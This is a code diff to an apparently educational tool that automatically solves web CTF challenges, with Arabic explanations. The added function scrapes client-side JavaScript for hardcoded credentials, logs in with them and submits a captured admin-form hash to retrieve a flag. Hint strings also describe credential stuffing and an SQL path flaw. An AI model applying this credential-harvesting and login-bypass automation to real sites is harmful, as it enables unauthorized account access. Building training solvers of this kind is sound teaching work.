@@ -37,7 +37,7 @@ from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin, quote
 
-__version__ = "2.8.0"
+__version__ = "2.9.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -1063,7 +1063,7 @@ _STATIC_GUIDANCE = {
     "credential-stuffing": "هذا تحدٍ عبر TCP وملف بيانات اعتماد منفصل، وليس صفحة HTTP. شغّل المحلل الطرفي على ملف creds-dump المرفق مع تأخير وحد أقصى للمحاولات ضمن خدمة التحدي فقط.",
     "secret-box": "افحص مصدر التطبيق المرفق. مسار إنشاء السر يضمّن المحتوى في SQL؛ أنشئ حسابًا تدريبيًا واستخدم ثغرة المسار لنسخ سر المشرف، ثم اقرأ السر بحسابك.",
     "bookmarklet": "ابحث عن bookmarklet في المصدر؛ اقرأ دالة فك النص ونفّذ تحويلها محليًا على السلسلة المضمّنة.",
-    "local-authority": "تحقق من ملف JavaScript الذي يربط النموذج؛ بيانات الاعتماد والتحقق موجودان في جهة العميل.",
+    "local-authority": "يتبع صقر مسار النموذج إلى login.php، ويقرأ secure.js المرتبط، ثم يستخدم الاعتمادين الموجودين فيه لإكمال نموذج المشرف المكتشف.",
     "cookie-monster": "افحص نموذج الدخول والكوكي التي يعيدها الخادم؛ فك الترميز Base64/URL محليًا بعد رصدها.",
     "cookies-2021": "يعتمد الحل على قيمة كوكي name المتغيرة؛ افحص القيمة الحالية ثم غيّر الرقم يدويًا ضمن هذا التحدي، وسيشرح صقر استجابة كل طلب.",
     "logon": "افحص كوكي الدور بعد تسجيل الدخول. يشرح صقر أثر قيمة admin إن ظهرت في استجابة التطبيق.",
@@ -1178,6 +1178,122 @@ def solve_intro_to_burp(client, origin, recon, steps, bodies, record,
         res["explanation_ar"].append("أعاد الخادم العلم بعد طلب POST لا يحتوي حقل otp؛ هذا يثبت خلل التحقق في مسار التحدي.")
     else:
         res["warnings"].append("لم تُرجع استجابة طلب OTP الفارغ علمًا؛ راجع حالة الاستجابة ونصها.")
+    return res
+
+
+def _redact_response_body(resp: dict, secrets_to_hide: list[str]) -> dict:
+    safe = dict(resp)
+    body = safe.get("body", "")
+    for value in sorted({x for x in secrets_to_hide if x}, key=len, reverse=True):
+        body = body.replace(value, "[hidden]")
+    safe["body"] = body
+    return safe
+
+
+def solve_local_authority(client, origin, recon, steps, bodies, record,
+                          flag_patterns) -> dict:
+    res = _base_result(origin, "Local Authority", "local-authority", recognized=True)
+    res["steps"] = steps
+    login_form = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
+                       {x.lower() for x in f.get("fields", [])}.issuperset({"username", "password"})), None)
+    res["discovered"] = {"login_fields": login_form.get("fields", []) if login_form else []}
+    if not login_form:
+        res["warnings"].append("لم يظهر نموذج POST يحوي اسم المستخدم وكلمة المرور؛ لم تُرسل بيانات دخول.")
+        return res
+
+    login_url = urljoin(origin, login_form.get("action") or "")
+    if urlsplit(login_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر نموذج دخول يشير إلى أصل آخر.")
+        return res
+    try:
+        login_page = client.request("GET", login_url)
+        record(login_page, ["فتح صقر وجهة نموذج الدخول التي ظهرت في HTML؛ يفحص الصفحة للعثور على تحقق العميل وموارده."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر فتح وجهة النموذج: {e}")
+        return res
+
+    scripts = [u for u in _page_resources(login_page["body"], login_url)
+               if urlsplit(u).path.lower().endswith(".js")]
+    credential_pair = None
+    credential_source = None
+    for script_url in scripts[:8]:
+        try:
+            js = client.request("GET", script_url)
+            match = re.search(r"function\s+checkPassword\s*\([^)]*\)\s*\{(.*?)\}", js["body"], re.I | re.S)
+            if match:
+                block = match.group(1)
+                um = re.search(r"\busername\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
+                pm = re.search(r"\bpassword\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
+                if um and pm:
+                    credential_pair = (um.group(2), pm.group(2))
+                    credential_source = urlsplit(script_url).path
+            record(_redact_response_body(js, list(credential_pair or ())),
+                   ["قراءة JavaScript مرتبط بصفحة الدخول؛ حُجبت أي بيانات اعتماد من سجل الاستجابة."])
+        except (OSError, http.client.HTTPException, ValueError):
+            continue
+    if not credential_pair:
+        res["warnings"].append("لم يعثر صقر في JavaScript المرتبط على مقارنة اسم مستخدم وكلمة مرور؛ لم يجرّب بيانات مخمّنة.")
+        return res
+
+    username, password = credential_pair
+    res["discovered"]["credential_source"] = credential_source
+    res["explanation_ar"].append("وجد صقر المقارنة الصريحة داخل دالة checkPassword في JavaScript؛ لم يخمّن بيانات الدخول.")
+    values = {}
+    for field in login_form["fields"]:
+        low = field.lower()
+        if low == "username": values[field] = username
+        elif low == "password": values[field] = password
+        elif low == "login": values[field] = "Login"
+    try:
+        login_response = client.request("POST", login_url, urlencode(values))
+        reflected_user = re.search(r"window\.username\s*=\s*(['\"])" + re.escape(username) + r"\1", login_response["body"], re.I)
+        reflected_pass = re.search(r"window\.password\s*=\s*(['\"])" + re.escape(password) + r"\1", login_response["body"], re.I)
+        login_html = login_response["body"]
+        form_evidence = next((f for f in find_forms(login_html)
+                              if "hash" in [x.lower() for x in f.get("fields", [])] and f.get("action")), None)
+        hash_input = None
+        for tag in re.findall(r"<input\b[^>]*>", login_html, re.I | re.S):
+            name = re.search(r"\bname\s*=\s*(['\"])hash\1", tag, re.I)
+            value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+            if name and value:
+                hash_input = html_lib.unescape(value.group(2)); break
+        if not hash_input:
+            hv = re.search(r"adminFormHash['\"]?\s*\)\s*\.value\s*=\s*(['\"])(.*?)\1", login_html, re.I | re.S)
+            if hv:
+                hash_input = html_lib.unescape(hv.group(2))
+        record(_redact_response_body(login_response, [username, password, hash_input or ""]),
+               ["أرسل صقر بيانات الاعتماد المطابقة للمصدر إلى نموذج POST المكتشف؛ حُجبت القيم من السجل."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال بيانات الدخول المكتشفة: {e}")
+        return res
+    if not (reflected_user and reflected_pass and form_evidence and hash_input):
+        res["warnings"].append("لم يؤكد رد login.php بيانات الدخول ونموذج المشرف المخفي؛ توقف صقر.")
+        return res
+
+    admin_url = urljoin(login_url, form_evidence["action"])
+    if urlsplit(admin_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر نموذج المشرف الذي يشير إلى أصل آخر.")
+        return res
+    admin_data = _hidden_form_values(login_html)
+    for field in form_evidence["fields"]:
+        if field.lower() == "hash":
+            admin_data[field] = hash_input
+    if not any(k.lower() == "hash" for k in admin_data):
+        res["warnings"].append("تعذر تحديد حقل hash في نموذج المشرف.")
+        return res
+    try:
+        admin_response = client.request("POST", admin_url, urlencode(admin_data))
+        record(_redact_response_body(admin_response, [username, password, hash_input]),
+               ["أرسل صقر قيمة الحقل من نموذج المشرف الذي أعاده التطبيق، ثم فحص الرد للعلم."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال نموذج المشرف المكتشف: {e}")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:admin-response", admin_response["body"])], flag_patterns)
+    if flag:
+        res["success"], res["flag"], res["flag_source"] = True, flag, source
+        res["explanation_ar"].append("قبل admin.php قيمة hash الواردة في نموذج HTML الذي أنشأه كود التحقق في جهة العميل.")
+    else:
+        res["warnings"].append("لم يظهر علم في رد نموذج المشرف؛ راجع الاستجابة المسجلة.")
     return res
 
 
@@ -1512,6 +1628,8 @@ def run_audit(url: str,
     if named:
         if named[1] == "intro-to-burp":
             return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
+        if named[1] == "local-authority":
+            return solve_local_authority(client, origin, recon, steps, bodies, record, flag_patterns)
         return _known_challenge_result(client, origin, recon, named[0], named[1],
                                        steps, bodies, record, flag_patterns)
 
